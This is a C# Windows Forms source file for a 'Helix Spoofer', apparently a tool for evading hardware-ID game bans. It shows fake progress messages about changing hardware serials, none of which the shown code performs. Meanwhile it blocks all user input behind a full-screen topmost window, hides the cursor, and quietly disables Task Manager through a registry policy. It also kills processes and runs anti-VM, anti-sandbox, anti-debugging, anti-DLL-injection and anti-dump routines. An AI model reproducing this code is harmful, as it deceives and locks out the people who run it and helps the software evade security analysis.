
using Anti_DebugNET.AntiDebugTools;
using Microsoft.Win32;
using permunban;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Helix_Spoofer
{
    public partial class Spoof : Form
    {

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern void BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]

        private static extern IntPtr CreateRoundRectRgn

(
    int nLeftRect,     // x-coordinate of upper-left corner
    int nTopRect,      // y-coordinate of upper-left corner
    int nRightRect,    // x-coordinate of lower-right corner
    int nBottomRect,   // y-coordinate of lower-right corner
    int nWidthEllipse, // height of ellipse
    int nHeightEllipse // width of ellipse
);
        int w = Screen.PrimaryScreen.Bounds.Width;
        int h = Screen.PrimaryScreen.Bounds.Height;

        public Spoof()
        {
            InitializeComponent();
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            gunaProgressBar1.Value += 250;




            if (gunaProgressBar1.Value >= 1000)
            {
                cpu.Text = "Pairing with the privileged components...";
                //ignore
            }


            if (gunaProgressBar1.Value >= 2000)
            {
                bios.Text = "Applying hardware serials modifcations...";
                //ignore
            }

            if (gunaProgressBar1.Value >= 4000)
            {
                baseboard.Text = "Disconnecting from the privileged components.";
            }

            if (gunaProgressBar1.Value >= 5000)
            {
                diskdrive.Text = "Cleaning files and registery entries...";
                //put here your load driver and clean traces script
            }

            if (gunaProgressBar1.Value >= 6000)
            {
                swofmac.Text = "Finializing execution with the server...";
                //ignore

                timer1.Enabled = false;
                {
                    RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                    if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                        objRegistryKey.SetValue("DisableTaskMgr", "1");
                }
                Scanner.ScanAndKill();
                AntiCrack_DotNet.AntiVirtualization.BadVMFilesDetection();
                AntiCrack_DotNet.AntiVirtualization.CheckForVMwareAndVirtualBox();
                AntiCrack_DotNet.AntiVirtualization.BadVMProcessNames();
                AntiCrack_DotNet.AntiVirtualization.CheckForHyperV();
                AntiCrack_DotNet.AntiVirtualization.CheckForKVM();
                AntiCrack_DotNet.AntiVirtualization.CrashingSandboxie();
                AntiCrack_DotNet.AntiVirtualization.IsCuckooSandboxPresent();
                AntiCrack_DotNet.AntiVirtualization.CheckForBlacklistedNames();
                AntiCrack_DotNet.OtherChecks.IsKernelDebuggingEnabled();
                AntiCrack_DotNet.OtherChecks.IsTestSignedDriversAllowed();
                AntiCrack_DotNet.OtherChecks.IsUnsignedDriversAllowed();
                AntiCrack_DotNet.AntiDllInjection.PatchLoadLibraryW();
                AntiCrack_DotNet.AntiDllInjection.PatchLoadLibraryA();
                AntiCrack_DotNet.AntiDllInjection.BinaryImageSignatureMitigationAntiDllInjection();
                // Maked by 44444 L
                da.AntiDLL.Load();
                AntiDump.Initialize();

                System.Threading.Thread.Sleep(700);

                BlockInput(false);
                Cursor.Show();
                this.Hide();
            }
        }
     


private void Spoof_Load(object sender, EventArgs e)
        {
            this.Location = new Point(0, 0);
            Size = new Size(w, h);
            TopMost = true;
            Cursor.Hide();
            BlockInput(true);
        }

        private void gunaProgressBar1_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}